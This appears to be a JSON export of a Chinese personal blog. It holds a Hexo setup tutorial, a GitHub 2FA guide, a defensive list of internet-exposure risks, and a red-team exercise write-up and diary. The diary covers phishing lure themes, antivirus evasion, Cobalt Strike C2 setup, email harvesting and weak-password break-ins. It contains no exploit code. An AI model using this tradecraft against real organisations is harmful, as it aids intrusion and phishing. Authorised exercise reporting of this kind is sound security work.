[{"title":"Test Stellar","path":"/2024/01/28/Test/","content":"测试文件 mermaid graph LR A(Section A) -->|option 1| B(Section A) B -->|option 2| C(Section C) graph TD; A-->B; A-->C; B-->D; C-->D; 实现博客专栏/专题 ……","tags":["Test"]},{"title":"Hexo 和 Stellar 搭建个人网站","path":"/2024/01/28/Hexo 和 Stellar 搭建个人网站/","content":"时间一晃就2024年了，偶然间在小红书上发现朋友正在使用这个主题，于是乎想趁着新年来临之际，在这无限接近幸福的时刻，给网站换上崭新的风格。——2024年1月27日17:57:35 一、说明 本文将涉及以下工具/服务，用于搭建和运行个人网站，之前网站代码一直没有维护，索性文章还有备份。 名称 说明 作用 Node.js 一个基于 Chrome V8 引擎的 JavaScript 运行环境，可以让 JavaScript 代码在服务器端执行 用于开发服务器端应用程序，运行 JavaScript 代码 Git 分布式版本控制系统 用于追踪文件的变化，协作开发和管理项目的版本 Hexo 静态博客框架，可以将 Markdown 文档解析渲染成静态的 HTML 网页 用于快速搭建和管理个人博客网站 Stellar Hexo 主题商务风主题 为 Hexo 博客提供商务风格的主题模板 github.pages 免费的静态站点托管服务，可以在 GitHub 仓库里托管和发布自己的静态网站页面 用于托管和发布静态网站，方便快捷 typora Markdown 编辑器，目前费用89.00 CNY 用于编辑和预览 Markdown 格式的文档，方便写作和编辑 npm Node.js 的包管理工具，用于安装和管理 JavaScript 包和依赖项 用于管理 JavaScript 包和模块的安装、卸载和更新 SSH 安全外壳协议（Secure Shell），用于在网络中安全地传输数据和命令 用于在网络中进行安全的远程登录和数据传输 YAML 一种人类可读性高的数据序列化格式，常用于配置文件和数据交换 用于编写易读易写的配置文件和数据交换格式 阿里云OSS 阿里云对象存储服务（Object Storage Service），用于存储和管理海量数据 用于存储和管理大量的文件和数据，提供高可靠性的存储服务 oss-browser 阿里云 OSS 的桌面客户端，用于便捷地管理和操作 OSS 上的文件 操作阿里云 OSS 的文件，管理你的图片 PicGo 一个开源的图片上传工具，支持多种图片上传方式和图床配置，可以方便地上传图片到指定的图床，并生成图片链接 用于快速上传图片到图床，方便在博客、论坛等地方引用图片 CDN 内容分发网络（Content Delivery Network），用于加速网站内容的传输 用于加速网站内容的传输，提高网站访问速度和用户体验 域名 网络上的地址，用于标识一个或多个 IP 地址的易记名称 用于在互联网上唯一标识一个网站或服务的地址 二、流程 1. GitHub 账户 首先，你需要拥有一个 GitHub 账户，注册流程不再赘述。注册完成后，你需要创建一个新的仓库（repository），仓库名应该是 “你的用户名.github.io”，其中的 你的用户名 部分需要使用你的 GitHub 帐号名称来代替。这是一种固定的命名规则。举例来说，如果我的 GitHub 帐号名是 “example”，那么我的仓库名就应该是：“example.github.io”。 请注意，目前 GitHub 实施了新的规定，出于安全考量，你需要启用 GitHub 的双重身份验证（2FA）。否则，渐渐地你可能会无法正常使用 GitHub。 2. 创建网站文件夹 在本地选择一个位置，创建你的博客文件夹。 3. 安装 Git、Node.js、Hexo 首先需要检查你的本机是否已经安装了这三项工具。以下是检查步骤 # 检查 Git git --version # 检查 Node.js node --version # 检查 Hexo hexo --version # 检查版本信息如下 Git 版本为：2.35.2.windows.1 Node.js 版本为：v21.5.0 Hexo 版本为：hexo-cli: 4.3.1 如果未显示版本信息或显示类似 “command not found”（命令未找到）的错误提示，则说明你尚未安装当前工具 咱们首先先下载 Git——https://git-scm.com/download/win 安装完成后，打开命令行并输入以下命令来测试是否成功安装了 Git，以下情况为安装成功 安装成功后，将你的 Git 与 GitHub 帐号绑定，鼠标右击打开 Git Bash。 # 配置 Git 用户名和邮箱：通过 `git config` 命令设置 Git 的全局用户名称和电子邮箱地址，这样在提交代码时就能够将其与你的 GitHub 帐号关联起来，让其他人知道是谁提交了这些更改。 git config --global user.name &quot;GitHub用户名&quot; git config --global user.email &quot;GitHub注册邮箱&quot; # 生成 SSH 密钥：SSH（Secure Shell）密钥对用于安全地与远程服务器进行通信，这里主要用于与 GitHub 进行安全通信。`ssh-keygen` 命令用于生成 SSH 密钥对，其中 `-t rsa` 参数指定了生成 RSA 类型的密钥，`-C` 参数用于指定注释，一般填写你的 GitHub 注册邮箱。 ssh-keygen -t rsa -C &quot;GitHub注册邮箱&quot; # 将 SSH 公钥添加到 GitHub 中：生成 SSH 密钥对后，公钥会保存在一个文件中，通常是 `~/.ssh/id_rsa.pub`。将这个公钥添加到你的 GitHub 帐号的 SSH 密钥设置中，这样 GitHub 就可以验证你的身份，并允许你通过 SSH 协议进行代码的读写操作。 生成密钥后，将其添加到 GitHub 中。 在 Git Bash 中输入以下命令检查 GitHub 公钥设置是否成功: # 这条命令会尝试连接 GitHub，并返回一个欢迎消息，确认 SSH 设置是否成功。 ssh -T git@github.com 可以看到，已经成功了 1. 提示 PS：我本人在这边踩了一个坑，可以在这边加上-v来看 debug ssh -vT git@github.com # 清除 DNS 缓存 ipconfig /flushdns 最后的解决方案是在本地 hosts 文件中强制 github.com 解析到 ip 140.82.113.3 hosts 文件通常位于——C:\\Windows\\System32\\drivers\\etc\\hosts 这种情况通常发生在 DNS 解析出现问题时。DNS（Domain Name System）负责将域名解析为对应的 IP 地址。当你尝试连接到 GitHub 时，你的计算机会向 DNS 服务器查询 GitHub 的 IP 地址，然后建立连接。 在你的情况下，由于某种原因，DNS 解析未能正确地将 GitHub 的域名解析为正确的 IP 地址，导致连接超时问题。通过将 GitHub 的域名手动映射到正确的 IP 地址，你绕过了 DNS 解析过程，成功建立了连接。 2. 提示 在C:\\Users\\xxx\\.ssh路径下，新建config文件 这个配置文件的作用是让 SSH 客户端在连接 GitHub 时使用指定的私钥进行身份验证，从而可以进行安全的通信，例如上传代码或者部署静态网站等操作。 User Host github.com HostName github.com User git IdentityFile ~/.ssh/id_rsa 下一步，安装Node.js、Hexo Node.js——https://nodejs.org/en/download # 使用 npm 命令安装 Hexo npm install -g hexo-cli # 初始化博客 hexo init npm 的下载速度受到网络环境和源服务器的影响，如果存在 npm 命令执行非常慢的情况，可以使用国内的镜像源来加速下载 # 淘宝镜像 npm config set registry https://registry.npm.taobao.org/ 会初始化 30M 左右的数据，所以hexo init会相对缓慢，可慢慢等待，等初始化结束后，可看到以下文件 # 直接在 Git Bash 中输出，本地预览 hexo s 然后访问 http://localhost:4000，即可本地预览 4. 更换主题 Stellar 是一个内置文档系统的简约商务风 Hexo 主题，之所以更换为该主题，主要还是因为，Stellar 的设计理念——真正的简约远不止删繁就简，而是在纷繁中建立秩序。 文档说明——https://xaoxuu.com/wiki/stellar/#start # 在终端中输入 npm i hexo-theme-stellar # 在 blog/_config.yml 文件中找到并修改 theme: stellar hexo s预览看一看，已经成功了！ 接下来就是修改GitHub\\MyBlog\\_config.yml和MyBlog\\themes\\stellar\\_config.yml _config.yml： 位置：GitHub\\MyBlog\\_config.yml 作用范围：全局 内容：主要包含整个Hexo博客的全局配置，例如网站标题、网站描述、网站URL、作者信息等。 用途：用于配置整个Hexo博客的基本信息和全局设置。 _config.yml： 位置：MyBlog\\themes\\stellar\\_config.yml 作用范围：主题级别 内容：主要包含与主题相关的配置，例如主题的特定功能设置、样式定制、布局等。 用途：用于配置Hexo博客所使用的特定主题的相关设置，允许用户对主题进行个性化定制和配置。 可以借助 ChatGPT 进行中英文比照，辅助修改 修改全局文件——位置：GitHub\\MyBlog\\_config.yml title: Rabbit's Blog language: - zh-CN - en theme: stellar 如果你要写文章，直接在MyBlog\\source\\_posts路径下写就可以了，格式为 .md，Typora 编写 Markdown 在文章的最上面，需要添加以下元信息： 这些元信息包括文章的标题、发布日期和封面图片链接。你可以根据需要修改这些信息。 --- title: 你的文章标题 date: 2024-01-27 17:16:59 cover: 也可以直接引用图片直链，这个位置为文章的图片 --- 新建关于我 about 页 hexo new page &quot;about&quot; hexo new page &quot;friends&quot; hexo clean ➜ hexo g ➜ hexo d 此处略过…… 5. 推送到 Github 修改全局文件——位置：GitHub\\MyBlog\\_config.yml deploy: type: git repo: GitHub仓库地址 branch: main # 仓库的分支 branch: main 是指定部署到 GitHub Pages 上的分支，可以在你的 Github 中进行查看 最后安装 Git 部署插件 npm install hexo-deployer-git --save # 清除 Hexo 项目中生成的静态文件和缓存文件 hexo clean # 生成静态文件 hexo g # 因为我本地文件与远程不符，所以强制覆盖 GitHub 上的内容 hexo deploy -f 最后输出这个，即为部署成功，现在xxxx.github.io就可以访问到了 可以看到hexo deploy -f后 Github 上也已经有了文件，并且标记了提交的时间 **PS：**为了避免博客数据丢失，可以在写完博客后，发布到 main 分支并备份源文件到 blog 分支。 master 分支：这个分支用于发布生成的静态博客页面。你使用 hexo clean、hexo generate 和 hexo deploy 这三步完成静态文件的生成和部署，最终会将生成的博客文件推送到 master 分支并发布上线。 blog 分支：这个分支用于保存博客的原始数据，比如 Hexo 的配置文件、原生的 Markdown 文件等。你在写完博客后，不仅需要生成静态文件发布到 master 分支，还要将这些原始文件手动提交到 blog 分支进行备份。 同步到 master 分支： 这三条命令是 Hexo 的标准部署流程： hexo clean：清理 Hexo 生成的缓存文件和静态文件，确保不会出现不必要的文件。 hexo generate：生成静态文件，即生成网站的 HTML、CSS、JS 等文件。 hexo deploy：部署网站，将生成的静态文件上传到你的博客仓库，通常是 gh-pages 或者其他远程分支上。 手动同步到 blog 分支： git add .：将所有改动（包括新增、修改、删除的文件）添加到 Git 暂存区。 git commit -m &quot;提交信息&quot;：提交改动，-m 后面的内容是提交说明。 git push origin blog：将本地的更改推送到远程的 blog 分支。 6. 阿里云OSS 阿里云 OSS 可以作为图床的存储后端，用户可以将图片上传到阿里云 OSS 中，并通过阿里云 OSS 提供的公开链接来访问这些图片，从而实现图床的功能。 在写文章的过程中，不可避免地会涉及到插入图片的需求。那么，问题来了，图片应该存储在哪里呢？ 一种常见的解决方案是使用图床。当博文中包含大量图片时，将图片直接存放在博客源代码中（通常是source文件夹）可能不太合适，因为这样会占用大量存储空间，而且加载速度也相对较慢。 因此，可以考虑将博文中的图片上传到图床，然后获取外部链接。这样做的好处是，可以极大地节省存储空间，并且加快网页加载速度。在使用Markdown语法插入图片时，只需使用外部链接即可完成插入![图片信息](外部链接) 我在这边使用的方案是“阿里云 OSS”，首先你需要一个阿里云账号，然后下载oss-browser，阿里云 OSS 的桌面客户端，剩余操作阅览官方文档即可 对象存储 OSS_云存储服务_企业数据管理_存储-阿里云 (aliyun.com) **费用：**值得注意的是，40G一年为9元左右，对于个人网站来说，绰绰有余 三、安全 B 站 UP 主，程序员鱼皮，曾经在 2023-03-04 发生过阿里云 OSS 被盗刷而透支费用. https://www.bilibili.com/video/BV1Tb411Q7V4/?spm_id_from=333.999.0.0&amp;vd_source=07d8fe8fdf49a7cf86a5c7925adf3667 1. 危害 未正确配置存储桶的访问策略或未限制访问来源。 如果设置了ListObject，这将会导致Bucket桶被遍历。 图床地址被暴露给第三方。 2. 解决方案 阿里云 OSS + Cloudflare 是指将对象存储服务（OSS）与内容分发网络（CDN）服务结合使用的一种方案。Cloudflare 的 CDN 用于加速，仅仅通过 CDN 访问资源，而 OSS 则提供存储支持。使用CDN服务，可以减少对源服务器的请求，进而降低了OSS成本。 Bucket 将 Bucket 访问权限改为私有 防盗链 开启防盗链，只设置白名单，为你的https://xxx.github.io 防盗链策略会根据 Referer 的值来判断请求是否合法，如果来源页面不是本站或者是允许的站点，则允许访问资源；否则，拒绝访问或者重定向到其他页面。 启动防盗链，空 Referer 设置为不允许时，在 Typora 编辑中，则无法显示，暂无法解决 消费预警 四、后记 如果文章有错误的地方，还请各位批评指正。","tags":["Hexo"],"categories":["杂谈闲记"]},{"title":"Stellar 主题优化","path":"/2024/01/03/Stellar主题优化/","content":"此文描述在设置Stellar主题时，所做的修改。 字体 因为该频道的定位是文章记录，所以文本在显示时易于阅读，是首先要考虑的。 由于经常使用微信读书APP，去阅读文字，而当时的选择恰恰是霞鹜文楷，用此字体一年有余，故此频道也继承而来。 本地字体引用 LXGW WenKai Screen / 霞鹜文楷屏幕阅读版 后来注意到作者 xaoxuu 提醒 但是我个人并不推荐引用本地字体，相比于英文字体，中文字体囊括了众多的字符，这也无法避免地导致字体文件体积的增加，拿 Noto Serif SC 来说，单个ttf文件就有9mb之大，这对于您的站点而言加载速度可想而知。 遂放弃本地字体引用 参考：利用 [霞鹜文楷] 美化网站字体 MyBlog\\themes\\stellar\\_config.yml 根据优先级，使用 LXGW WenKai Screen 字体作为文本的主要字体。 # CSS 中写入 font-family: body: '&quot;LXGW WenKai Screen&quot;, sans-serif, &quot;system-ui&quot;, &quot;Microsoft Yahei&quot;, &quot;Segoe UI&quot;, -apple-system, Roboto, Ubuntu, &quot;Helvetica Neue&quot;, Arial, &quot;WenQuanYi Micro Hei&quot;, sans-serif' # inject: head: - &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/lxgw-wenkai-screen-webfont/1.6.0/lxgwwenkaiscreen.css&quot; media=&quot;print&quot; onload=&quot;this.media='all'&quot;&gt; script: PS：注意缩进，不然无法hexo g会报错 顶部 tab 栏 MyBlog\\themes\\stellar\\_config.yml nav_tabs: # 近期发布 分类 标签 专栏 归档 and ... # '朋友文章': /friends/rss/ '安全资讯': /cybernews/index.html '留言板': /comments/index.html 侧边栏配置 title: 网站名称 avatar: 头像 logo: subtitle: '' # '文字1 | 文字2' (鼠标放上去会切换到文字2) 评论 …… 参考文章 https://blog.c2red.com/posts/93d49515.html","tags":["Hexo","美化","Stellar"],"categories":["杂谈闲记"]},{"title":"大隐隐于市","path":"/2024/01/01/大隐隐于市/","content":"4726bbc9ea369f744cf597d75ccaf73bd3e307ae2b7d5a8eee172021da6b7cf60b2a1e4efbab6b21a9bf12b0af937d1d21a309e57f8ffd24b8cfcff883571f9de14949db8f92acec21b39fdc1bd9e5cc2049b426228155302029c01816139f261427d4d045e9df3f80b9917e281da86729ac18f9ced51f2268d6605549e3ba09ac70fd2d7c23f841c7dbfe04e5a7c1c1 欲救生快活，须下死功夫"},{"title":"GitHub 2FA（双重身份验证）如何开启（China）","path":"/2023/09/20/2FA（双重身份验证）如何开启（China）/","content":"GitHub 2FA是一种安全措施，可以保护你的GitHub账号不被盗用或滥用。开启2FA后，你需要输入密码和一个一次性的验证码（OTP）才能登录GitHub。这样，即使你的密码泄露了，黑客也无法登录你的账号，除非他们也能获取你的OTP。 开启2FA的流程 Chrom 应用商店 - 身份验证器 Authenticator Extension 身份验证器是一个在浏览器中生成二步认证代码的工具，通过扫描二维码添加账户，提高账户安全性。 要开启GitHub 2FA，你需要以下几个步骤： 登录GitHub，点击右上角的个人资料照片，然后点击“设置”。在页面的“双因素身份验证”部分，点击“启用双因素身份验证”。 选择你想要使用的2FA方法，有以下两种可选： **使用TOTP应用：**使用先前下载的浏览器拓展，然后扫描GitHub显示的二维码。你的应用会显示一个六位数的代码，你需要在GitHub上输入该代码进行验证。 **使用短信：**你需要输入你的国家/地区代码和手机号码，（注：没有中国+86选项）然后点击“发送验证码”，即可通过验证。 在“保存恢复代码”下，点击“下载”将恢复代码下载到你的设备。恢复代码是一组16个字母和数字的组合，可以在你无法使用你的2FA方法时帮助你恢复你的账号。你应该将它们保存到一个安全的地方，如密码管理器或纸质备份。保存恢复代码后，点击“我已保存恢复代码”，以完成2FA的启用。 开启2FA的原因 开启2FA的主要原因是为了提高你的账号安全性。GitHub是一个全球最大的开源代码托管平台，也是许多开发者和组织的重要工具。如果你的GitHub账号被盗用或滥用，可能会导致你的代码、数据、项目或声誉受到损失或威胁。开启2FA可以有效防止这种情况的发生，因为它增加了登录你的账号的难度，让黑客无法仅凭密码就入侵你的账号。 开启2FA的另一个原因是为了遵守GitHub的要求。GitHub在2023年宣布，到2023年底，所有用户都必须要启用一种或多种形式的2FA，以保护软件供应链的安全。如果你不开启2FA，你可能会失去对GitHub的访问权限，或者无法参与某些需要2FA的组织或项目。 开启2FA的原理 开启2FA的原理是基于一种叫做双因素身份验证（Two-Factor Authentication，简称2FA）的安全技术。2FA是一种要求用户提供两种不同的身份验证因素来证明自己身份的方法。这两种因素通常分为以下三类： 知识因素：你知道的东西，如密码、PIN码或安全问题的答案。 拥有因素：你拥有的东西，如手机、密钥或银行卡。 生物因素：你本身的特征，如指纹、面部识别或虹膜扫描。 2FA的目的是增加登录账号的难度，使得即使黑客获取了其中一个因素，也无法登录账号，除非他们也能获取另一个因素。这样，就可以有效降低账号被盗用或滥用的风险。 GitHub 2FA的原理是使用密码作为第一个因素，使用OTP、短信或密钥作为第二个因素。密码是你知道的东西，OTP、短信或密钥是你拥有的东西。当你登录GitHub时，你需要输入密码和第二个因素，才能成功登录。这样，即使你的密码泄露了，潜在分子也无法登录你的账号，除非他们也能获取你的第二个因素。 总结 GitHub 2FA是一种保护你的GitHub账号不被盗用或滥用的安全措施。开启2FA后，你需要输入密码和一个一次性的验证码（OTP）、短信或密钥才能登录GitHub。开启2FA的流程是选择你想要使用的2FA方法，验证你的身份，保存恢复代码。开启2FA的原因是为了提高你的账号安全性，以及遵守GitHub的要求。开启2FA的原理是使用两种不同的身份验证因素来证明你的身份，使得潜在分子无法仅凭密码就入侵你的账号。开启2FA是一种简单而有效的保护你的GitHub账号的方式，建议大家都尽快开启。","tags":["Github","2FA"],"categories":["杂谈闲记"]},{"title":"常见暴露公网风险点","path":"/2023/08/11/常见暴露公网风险点/","content":"1. 弱口令/默认账号密码 暴露风险等级：高风险 暴露说明及危害： 系统中存在弱口令，可以轻松登录，进一步进行攻击，如上传 WebShell 或获取敏感数据。 默认账号和密码的暴露可能导致未经授权的访问和操作。 漏洞利用： 利用弱口令或默认密码进入管理后台，进行未授权操作。 修复建议： 强制用户首次登录时修改默认密码。 完善密码策略，建议密码长度至少 8 位，并包含数字、大写字母和特殊字符。 对管理后台实施访问控制，定期修改密码，并增强口令强度。 增加防暴破机制，限制 IP 和 Cookie 的访问次数。 2. 接口泄露 暴露风险等级：高风险 暴露说明及危害： Swagger生成的API文档直接暴露在特定的Web路径下，任何人都可以访问和查看。这使得用户能够获取项目的所有接口信息。 例如，如果存在文件读取相关的接口，可能会导致任意文件下载。这种访问可能导致未授权的业务操作以及敏感信息的泄露、脱敏获取密码等。 漏洞利用： 暴露的 API 文档可能让获得直接攻击服务器的攻击路径，并猜解 API 功能，给提供更具体的攻击路径。 修复建议： 将 Swagger-UI 的 URLs 加入认证和授权过滤链，仅允许经过认证的用户访问。 3. JS敏感信息泄露 暴露风险等级：高风险 暴露说明及危害： JS 代码中可能存在敏感信息（如用户名、邮箱、手机号、URL路径等），可利用这些信息进行进一步攻击。 漏洞利用： 假设已知用户名和邮箱，可以通过爆破方式尝试获取密码；同时，访问敏感路径可以获取有用信息进行进一步利用。邮箱也可以收集起来，用来发送钓鱼邮件。 修复建议： 隐藏敏感信息，并定期进行安全渗透测试以检测暴露信息。 4. PHP信息泄漏 暴露风险等级：高风险 暴露说明及危害： 某些Web站点的测试页面可能调用PHP的phpinfo()函数，该函数会输出服务器的关键信息，导致信息泄露。这些信息可以被用于制定后续的攻击策略。 漏洞利用： 通过获取组件的版本，寻找历史漏洞进行攻击 系统识别： phpinfo() 提供了服务器环境的详细信息，包括操作系统类型和版本、服务器软件等。可以使用这些信息制定针对性的攻击策略，因为不同的操作系统和软件可能有不同的安全漏洞。 模块识别： phpinfo() 还列出了已加载的PHP模块和扩展。可以利用这些信息了解服务器上是否存在特定的模块，从而针对性地尝试攻击这些模块。 路径信息： phpinfo() 可能显示PHP的配置文件路径、临时目录等信息。可以使用这些路径信息来构造文件包含攻击或利用其他路径相关的漏洞 修复建议： 删除或限制 phpinfo() 的访问，确保不对外暴露服务器的关键信息。 5. 未授权访问 暴露风险等级：高风险 暴露说明及危害： 由于没有对相关敏感页面进行访问权限的检查，（无登陆框，无审核验证直接可以访问），导致攻击者可未授权访问，从而获取敏感信息及进行未授权操作等！ 漏洞利用： 黑客发现后，在公网上直接进行访问，做增删改查的高危操作。尽管不确定是什么系统，胡乱操作也可能导致业务出现问题。 修复建议： 对敏感页面实施严格的访问权限控制，确保每个访问角色进行权限检查。 6. 目录遍历 暴露风险等级：高风险 暴露说明及危害： 由于服务器配置不当，开启了目录浏览，可获取文件目录结构，从而下载敏感文件。 漏洞利用： 通过目录遍历可获取敏感信息，获取敏感文件并近一步利用。 修复建议： 通过修改配置文件，去除中间件（如IIS、apache、tomcat）的文件目录索引功能 设置目录权限 7. 云存储信息泄露（高危） 暴露风险等级：高风险 暴露说明及危害： 存储桶未设置为私有（设置为了公有读），导致其内容可以被访问。根据业务场景的不同，云存储中的数据类型也会有所不同，这带来了很高的风险。 对个人，公开的存储桶可能泄露私密的个人信息、照片、视频等，导致隐私被侵犯，进一步导致身份盗用。 对企业，公开访问的存储桶可能泄露商业机密、敏感文件、客户数据等，影响企业声誉，导致经济损失和法律责任。 公开访问的存储桶可能泄露以下信息： 存储桶名称、存储在桶中的图片、视频、文件和应用程序，存储桶内所有资源的路径、存储桶信息的更新时间，以及存储桶资源的MD5哈希值。 漏洞利用： 可以获取存储桶中大量数据，造成数据泄露，对公司声誉造成较大影响。 修复建议： 将 Bucket 访问权限改为私有 开启防盗链，只设置白名单，防盗链策略会根据 Referer 的值来判断请求是否合法，如果来源页面不是本站或者是允许的站点，则允许访问资源；否则，拒绝访问或者重定向到其他页面。 B 站 UP 主，程序员鱼皮，曾经在 2023-03-04 发生过阿里云 OSS 被盗刷而透支费用。 https://www.bilibili.com/video/BV1Tb411Q7V4/?spm_id_from=333.999.0.0&amp;vd_source=07d8fe8fdf49a7cf86a5c7925adf3667 针对以上，个人使用OSS云存储的情况下，我们可以开启 消费预警 8. 错误页面信息泄露 暴露风险等级：高风险 暴露说明及危害： 返回详细的错误信息可能会泄露服务器的内部信息，包括服务器代码、数据库连接信息、SQL语句、个人信息以及敏感文件的路径，这些信息为信息收集提供了便利。 漏洞利用： 通过获取服务器的后端版本、框架和绝对路径等信息，可能导致针对这些暴露信息的进一步利用。 修复建议： 在编码时添加异常处理模块，统一定制错误页面，避免展示服务器版本信息； 不对外公开程序运行时的异常错误详情； 最好禁止返回任何与系统相关的信息，以降低风险 9. 短信/邮件轰炸 暴露风险等级：高风险 暴露说明及危害： 短信/邮件轰炸（仅仅是指直接点击发送短信按钮，即可造成轰炸，非进一步探测，漏洞利用而造成的轰炸，二者不可相提并论）。 由于没有对短信或者邮件发送次数进行限制，导致可无限次发送短信或邮件给用户，从而造成短信轰炸，进而可能被大量用户投诉，从而影响公司声誉！ 短信话费金额骤升。 漏洞利用： 通过短信或邮件炸弹，进行公司短信或邮件资源进行消耗。 修复建议： 限制发送次数，设置合理的频率限制。 10. 内部系统登录页暴露 暴露风险等级：高风险 暴露说明及危害： 内部系统登录页对外暴露，搜集信息完备的情况下，有概率获取内网权限。 修复建议： 收敛内部统一身份认证系统，限制外部访问。 11. 测试平台泄露 暴露风险等级：高风险 暴露说明及危害： 测试平台的公开暴露可能导致测试代码、测试账号、默认账号等敏感信息的泄露，这可能被利用来进行进一步的攻击。 漏洞利用： 通过攻击测试平台获取权限，或在成功攻击后获取一些信息，从而攻击真实的业务平台。 修复建议： 建议关闭测试平台对外开放，以防止敏感信息的泄露。 12. 默认界面及中间件Web入口 暴露风险等级：中风险 暴露说明及危害： 在搭建网站或应用程序时，通常会生成一个默认的欢迎页面或管理界面。如果这些默认界面被公开而且没有经过适当的配置，就可能带来安全隐患。攻击者可以利用这些默认页面的信息来识别系统的弱点，进而进行有针对性的攻击。 相关中间件： Nginx OpenResty WildFly 8 IIS Apache Tomcat Apache2 Ubuntu XAMPP Tengine Oracle 漏洞利用： 根据已知的历史版本漏洞，攻击者可能会得知使用的产品及其版本，从而找到已知的弱点进行攻击。 修复建议： 不要让别人看到这些默认页面，修改默认文档设置以指向自定义首页。 只有必需功能被开放给最终用户访问.。 13. 源IP泄露 暴露风险等级：高风险 暴露说明及危害： 通过直接访问IP地址，系统可能成为网络攻击的目标，绕过访问控制。 修复建议： 使用域名访问：尽量使用域名而不是IP地址进行访问，以提升系统的安全性和可管理性。 配置访问控制：使用防火墙和访问控制列表（ACL）来限制对系统的访问，仅允许必要的服务和端口对外开放，并拒绝未经授权的访问。 限制对敏感信息的访问：如果可能，将敏感信息存储在内部网络中，并限制对这些信息的直接外部访问，或使用零信任。 14. 暴露系统版本 暴露风险等级：中风险 暴露说明及危害： 暴露的系统版本信息可能使攻击者获取有关系统的关键信息，从而进行进一步的攻击。攻击者可以通过收集系统版本信息，寻找与该版本相关的已知漏洞，并利用这些漏洞获取对服务器的控制权限。 修复建议： 通过修改或隐藏系统版本信息，防止攻击者对系统对应版本进行攻击。 15. VPN登录口 暴露风险等级：高风险 暴露说明及危害： VPN软件的类型和版本。这些信息可以被攻击者用来研究可能的漏洞。暴露VPN登录口可能扩大整个网络的攻击面，攻击者可能通过这一接口找到其他可利用的内部资源。 修复建议：限制VPN登录口的公网访问权限","tags":["暴露面"],"categories":["网络安全"]},{"title":"2023年某直辖市通管局攻防演练总结","path":"/2023/07/31/2023年某直辖市通管局攻防演练总结/","content":"攻击路径 目标1——敏感信息泄露 通过对备案域名进行信息收集，获取到相关域名，访问并查看JS文件，获取到敏感信息。 目标2——域名备案管理系统弱口令漏洞 通过信息收集得到相关地址，使用弱密码登录后台，获取配置信息，其中包含云存储的“KEY”，进而访问云存储，查看敏感文件。 目标3——全版本源代码泄露（2亿3千万行）、目录遍历 通过信息收集发现该资产，进行目录遍历，确认全版本源代码的泄露，涵盖游戏各个功能模块。 目标4——数据中心弱口令攻击获取超级管理员权限 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台，获得超级管理员权限。 目标5——后台登录中心源代码泄露、游戏装备数据泄露 通过信息收集，利用.git泄露获得该站点的源代码，获取到包含敏感信息的Excel文件。 目标6——存储管理系统弱口令 通过信息收集得到相关地址，使用弱密码登录后台，获取配置信息，并访问云存储。 目标7——File**站点弱口令 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台。 目标8——***GM后台弱口令 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台，获得管理员权限。 目标9——***后台弱口令，存在RCE 通过信息收集梳理发现该系统，进行弱口令攻击，成功登录后台并获取管理员权限，发现存在远程命令执行漏洞。 渗透成果说明 通过信息收集，得到多个平台，使用弱密码（如 admin/123456）登录后台。 通过密钥信息，进入云存储获得敏感代码文件。 总结 因为信息收集的质量和深度直接影响了攻防演练的效果和成果，所以在此次攻防中，主要手法是不断扩大信息收集的范围，找到薄弱的资产；一方面，从信息收集的工具来说，我们采用多个平台、多个工具，多管齐下；另一方面，对搜集的资产进行指纹识别，识别出重点资产，重点关注OA、邮件、网站后台管理等容易存在大量上传点的系统，寻找弱口令进入，在大量的信息中，检索出真正存在问题的资产，是一个繁复的过程。而在此次攻防中，总共找到了7个弱口令，对于弱口令的挖掘，收益颇丰，有赖于信息收集的广度。 但使用钓鱼攻击有收获但微乎其微，一方面是因为对钓鱼的利用方式不熟练，另一方面对免杀的了解程度不够，对攻防演练更新迭代的攻击手法不够了解，且规则既定，但游离于规则之外称之为行业内的潜规则也绊了我们一脚。","tags":["攻防演练"],"categories":["网络安全"]},{"title":"2023年某直辖市通管局攻防演练碎碎念","path":"/2023/07/31/2023年某直辖市通管局攻防演练碎碎念/","content":"背景 2023年pánshí行动于崇明区长兴岛开展，三人组队代表公司参加活动，以下是一些碎碎念…… 每天必做 录屏、上传录屏 信息搜集工具 环境 名称 作用 Xshell-云服务器 水泽 信息收集 Xshell-云服务器 Oneforall 查询子域名 Xshell 灯塔 信息收集 Windows平台 零零信安 信息收集，只能一个账号登录 Windows平台 EHole 指纹识别 Windows平台 Enscan 查询控股公司 Windows平台 FofaViewer 信息收集 Windows平台 站长工具 查询备案归属 Windows平台 爱企查 查询公司备案 Windows平台 天眼查 查询公司备案 Windows平台 CS客户端 钓鱼、木马 **行动跳板机-47.103.83.40 CS服务端 钓鱼、木马 Windows平台 EmailALL 搜集公司邮箱 Xshell-172.18.157.198 Goby …… 流水账 2023年7月20日11:05:38 搭建了灯塔平台——ARL资产灯塔系统搭建 2023年7月20日11:09:44 研究钓鱼，规则文件： 在使用社会工程学攻击、钓鱼攻击及水坑攻击时，禁止使用涉及政治因素，违背伦理道德等因素的缘由进行攻击，否则将对攻击方进行扣分处理。 红蓝对抗 | 企业级攻防演练钓鱼行动 时间 了解员工上下班时间 邮件内容 通知类（漏洞预警、修改口令、红头文件等） 福利类（节日礼包、礼卷等） 热点新闻类（防疫新闻、俄乌战争等）。 2023年7月20日11:31:22 申请**行动服务器，Centos7.0，安装python3、jdk11 2023年7月20日15:22:38 免杀技术 - go shellcode 加载 bypassAV 看资源修改、伪造签名 2023年7月20日17:55:30 沟通云服务器，OA审批流程 2023年7月20日19:06:38 使用Docker部署思源笔记，在公司Centos服务器上 使用Docker部署思源笔记，可通过WEB访问 发现一个工具：EASY233/Finger: 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 和Ehole有什么不同呢？ 2023年7月21日10:20:00 Centos7.0，安装python3、和jdk11 2023年7月21日10:41:24 安装 Cat CS，二次开发 猫猫Cs:基于Cobalt Strike[4.5]二开 (原dogcs二开移植) 解压密码：低调求发展潜心习安全好好学习天天向上 Windows端，运行java -jar cat_client.jar client 2023年7月21日13:31:18 我在Windows端已经可以运行CobaltStrike_Cat_4.5，我如何把 CobaltStrike sever 端上传到**行动的跳板机 安装的CS服务端 2023年7月21日15:24:30 终于装好啦！！！ 2023年7月21日16:01:37 安装搜集邮箱的工具 Taonn/EmailAll.git https://github.com/Taonn/EmailAll.git # http://www.veryvp.com/ veryvp_username = '****' veryvp_password = '****' # https://www.github.com # 新 # 旧 github_token = ''****'' # https://app.snov.io/ snov_username = ''****'' snov_password = ''****'' # https://phonebook.cz/ pb_key = ''****'' # ***** python3 emailall.py --domain *****.com run # ✅ 2023年7月21日17:01:37 思考钓鱼内容 …… 